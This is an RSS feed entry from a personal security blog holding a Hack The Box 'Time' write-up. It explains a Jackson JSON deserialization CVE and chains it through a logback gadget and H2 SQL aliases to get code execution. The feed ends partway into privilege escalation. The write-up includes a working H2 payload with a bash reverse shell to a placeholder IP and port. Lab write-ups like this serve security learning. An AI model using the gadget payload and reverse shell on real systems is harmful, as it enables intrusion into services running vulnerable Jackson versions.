@@ -1,0 +1,366 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Writeups on Vlaghe&#39;s Blog</title>
+    <link>https://vlaghe.github.io/writeups/</link>
+    <description>Recent content in Writeups on Vlaghe&#39;s Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Thu, 27 May 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://vlaghe.github.io/writeups/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Time Hackthebox</title>
+      <link>https://vlaghe.github.io/writeups/htb/time/</link>
+      <pubDate>Thu, 27 May 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://vlaghe.github.io/writeups/htb/time/</guid>
+      <description>Overview This box is a Linux one. For the initial foothold you need to exploit a bug within the Jackson library for deserializing JSON&amp;rsquo;s leading to a SSRF which can leverage a RCE. Once on the box a simple classic enumeration reveals a root bash script with read/write access. Consequenlty, just importing your pub SSH key into the authorized_keys file will grant access to root.
+Enumeration Running nmap reveals 2 services:</description>
+      <content>&lt;h2 id=&#34;overview&#34;&gt;Overview&lt;/h2&gt;
+&lt;p&gt;This box is a Linux one. For the initial foothold you need to exploit a bug within the Jackson library for deserializing &lt;strong&gt;JSON&amp;rsquo;s&lt;/strong&gt; leading to a SSRF which can leverage a RCE. Once on the box a simple classic enumeration reveals a root bash script with read/write access. Consequenlty, just importing your pub &lt;strong&gt;SSH&lt;/strong&gt; key into the &lt;code&gt;authorized_keys&lt;/code&gt; file will grant access to root.&lt;/p&gt;
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;Running nmap reveals 2 services:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; nmap -sC -sV -oA nmap/time 10.10.10.214
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp open  http    Apache httpd 2.4.41 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-server-header: Apache/2.4.41 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title: Online JSON parser
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once we check the web server, we see that we can beutify/validate JSON. Also, the validate functionality is in Beta. So let&amp;rsquo;s check that first.
+&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;Upon submitting &lt;code&gt;{&amp;quot;test&amp;quot;}&lt;/code&gt; we see the following error:
+&lt;code&gt;Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;So it&amp;rsquo;s expecting an array: &lt;code&gt;[&amp;quot;test&amp;quot;]&lt;/code&gt;.
+But that also throws an error:
+&lt;code&gt;Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Could not resolve type id &#39;test&#39; as a subtype of [simple type, class java.lang.Object]: no such class found&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Now, in both of our errors we see that they&amp;rsquo;re thrown by a library called &lt;em&gt;jackson&lt;/em&gt;, which is used to
+serialize or map POJO &lt;em&gt;(Plain Old Java Objects)&lt;/em&gt; to JSON and deserialize JSON to POJO. With some more searching we find a &lt;a href=&#34;https://blog.doyensec.com/2019/07/22/jackson-gadgets.html&#34;&gt;CVE&lt;/a&gt; which addresses a deserialization vulnerability where an attacker could control the class to be deserialized.&lt;/p&gt;
+&lt;h2 id=&#34;understanding-the-cve&#34;&gt;Understanding the CVE&lt;/h2&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;What is serialization/deserialization&lt;/strong&gt;&lt;/em&gt;
+In order to understand what deserialization vulnerabilities are and behave, we firstly need to get familiar with what serialization &amp;amp; deserialization is. Swapneil Kumar Dash wrote a beautiful &lt;a href=&#34;https://medium.com/@swapneildash/understanding-java-de-serialization-ee96054da15d&#34;&gt;article&lt;/a&gt; about this, however I will provide a short overview in this post as well.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;In computing, serialization  is the process of translating a data structure or object state into a format that can be stored or transmitted and reconstructed later. Deserialization is the opposite.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;In our case, we translate java objects into JSON and vice-versa.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;* What could go wrong ?
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Usually, in java we can use something like this to deserialize data:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FileInputStream fin  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; FileInputStream&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;your/file/path&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ObjectInputStream in &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ObjectInputStream&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;fin&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;customClassInstance  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;CustomClass&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; in&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;readObject&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The main problem lies within the way readObject deserializes data which executes the class while also
+throwing an error if we give it a serialized input of a different class.&lt;/p&gt;
+&lt;p&gt;I won&amp;rsquo;t go into much detail here on this topic, since it&amp;rsquo;s a broad one. However, if you&amp;rsquo;re interested in
+learning more about it you should check the resources and &lt;a href=&#34;https://www.youtube.com/watch?v=t-zVC-CxYjw&#34;&gt;this talk&lt;/a&gt; by &lt;strong&gt;Alexei Kojenov&lt;/strong&gt; which also made some great &lt;a href=&#34;https://github.com/kojenov/serial&#34;&gt;examples&lt;/a&gt; you can play
+around with.
+&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;How java gadgets work&lt;/strong&gt;&lt;/em&gt;
+Gadgets are just a class or funcion that&amp;rsquo;s available within the executing scope of an application. For example the following code is a simple implementation in Java:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* CacheManager.java */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CacheManager&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;implements&lt;/span&gt; Serializable &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; Runnable initHook&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;readObject&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ObjectInputStream in&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		in&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;defaultReadObject&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		initHook&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* CommandTask.java */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CommandTask&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;implements&lt;/span&gt; Runable&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; Serializable &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; String cmd&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CommandTask&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;String cmd&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;cmd&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cmd&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		Runtime&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getRuntime&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cmd&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here, an attacker can inject a serialized &lt;code&gt;CommandTask&lt;/code&gt; into an input stream that will be read by &lt;code&gt;CacheManager&lt;/code&gt;, which in return invokes run. Therefore, he gains arbitrary command execution.
+&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;Jackson library deserialization vulnerability POC&lt;/strong&gt;&lt;/em&gt;
+The &lt;em&gt;CVE&lt;/em&gt; of interest is focusing mostly on the &lt;em&gt;Jackson&lt;/em&gt; library. They found that when &lt;em&gt;Jackson&lt;/em&gt; deserializes a specific class (&lt;code&gt;ch.qos.logback.core.db.DriverManagerConnectionSource&lt;/code&gt;), it can be abused to instantiate a Java Database Connectivity &lt;em&gt;(JDBC)&lt;/em&gt;, which is used to connect &amp;amp; interact with the dabase. To understand better let&amp;rsquo;s break down the payload used in the &lt;a href=&#34;https://blog.doyensec.com/2019/07/22/jackson-gadgets.html&#34;&gt;&lt;strong&gt;POC&lt;/strong&gt;&lt;/a&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$ &amp;quot;[\&amp;quot;ch.qos.logback.core.db.DriverManagerConnectionSource\&amp;quot;, {\&amp;quot;url\&amp;quot;:\&amp;quot;jdbc:h2:mem:\&amp;quot;}]&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;As said previously we use the &lt;code&gt;DriverManagerConnectionSource&lt;/code&gt; class to pass an url, which will trigger &lt;a href=&#34;https://www.javadoc.io/doc/ch.qos.logback/logback-core/1.1.11/ch/qos/logback/core/db/DriverManagerConnectionSource.html#setUrl(java.lang.String)&#34;&gt;&lt;code&gt;setUrl&lt;/code&gt;&lt;/a&gt;. Afterwards, the object is serialized into a JSON object again. Consequently, the &lt;code&gt;getConnection()&lt;/code&gt; &lt;a href=&#34;https://www.javadoc.io/static/ch.qos.logback/logback-core/1.1.11/ch/qos/logback/core/db/DriverManagerConnectionSource.html#getConnection()&#34;&gt;method&lt;/a&gt; is called which creates an in-memory database. This is further used to create a remote connection.
+&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;Until now, we&amp;rsquo;ve only got a way to generate a Server Side Request Forgery &lt;em&gt;(SSRF)&lt;/em&gt;. So how could we turn this into a full chain RCE ?
+In order to achieve that, the guys from &lt;a href=&#34;https://doyensec.com/&#34;&gt;doyensec&lt;/a&gt; leveraged the &lt;a href=&#34;http://www.h2database.com/html/features.html&#34;&gt;H2&lt;/a&gt; JDBC driver which has the capability to run SQL scripts from the JDBC url. This alone won&amp;rsquo;t allow an attacker to run Java code inside the JVM context, however H2 has the capability to specify custom aliases containing java code &lt;a href=&#34;https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html&#34;&gt;which can be abused&lt;/a&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ALIAS&lt;/span&gt; SHELLEXEC &lt;span style=&#34;color:#66d9ef&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$$&lt;/span&gt; String shellexec(String cmd) throws java.io.IOException &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	java.util.Scanner s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; java.util.Scanner(Runtime.getRuntime().&lt;span style=&#34;color:#66d9ef&#34;&gt;exec&lt;/span&gt;(cmd).getInputStream())
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		.useDelimiter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\\A&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; s.hasNext() &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; s.&lt;span style=&#34;color:#66d9ef&#34;&gt;next&lt;/span&gt;() : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}$$&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;CALL&lt;/span&gt; SHELLEXEC(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;whoami&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As a result, we only need to serve a sql file to the target machine that makes the request to our in-memory &lt;em&gt;DB&lt;/em&gt; with the use of &lt;code&gt;DriverManagerConnectionSource&lt;/code&gt; and we have remote code execution.&lt;/p&gt;
+&lt;h2 id=&#34;leveraging-what-weve-learned-for-getting-user&#34;&gt;Leveraging what we&amp;rsquo;ve learned for getting user&lt;/h2&gt;
+&lt;p&gt;We&amp;rsquo;ve learned that we can use a deserialization vulnerability within Jackson to leverage a connection to a in-memory &lt;em&gt;DB&lt;/em&gt;, which accepts aliases that can be used to execute commands. So, all wee need to do is:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;em&gt;Prepare the &lt;code&gt;inject.sql&lt;/code&gt; script&lt;/em&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CREATE ALIAS SHELLEXEC AS $$ String &lt;span style=&#34;color:#a6e22e&#34;&gt;shellexec&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;String cmd&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;throws&lt;/span&gt; java&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;io&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;IOException&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	java&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;util&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Scanner&lt;/span&gt; s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; java&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;util&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Scanner&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Runtime&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getRuntime&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cmd&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getInputStream&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;useDelimiter&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\\A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;hasNext&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;next&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;$$&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CALL &lt;span style=&#34;color:#a6e22e&#34;&gt;SHELLEXEC&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;bash &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;dev&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;tcp&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;IP&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;PORT 0&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;amp;&lt;/span&gt;1&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;em&gt;Setup http server &amp;amp; netcat listener&lt;/em&gt;
+&lt;img src=&#34;https://i.imgur.com/kYaG0vZ.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;em&gt;Abuse the deserialization vulnerability &amp;amp; use the &lt;code&gt;DriverManagerConnectionSource&lt;/code&gt; gadget&lt;/em&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;em&gt;Enjoy your shell&lt;/em&gt;
+&lt;img src=&#34;https://i.imgur.com/jh0fwLP.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;privilige-escalation&#34;&gt;Privilige escalation&lt;/h2&gt;
+&lt;p&gt;Once on the box, a simple enumeration reveals that we have write access to a backup script ran by root.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bash-5.0$ cat /usr/bin/timer_backup.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat /usr/bin/timer_backup.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash&lt;/span&gt;
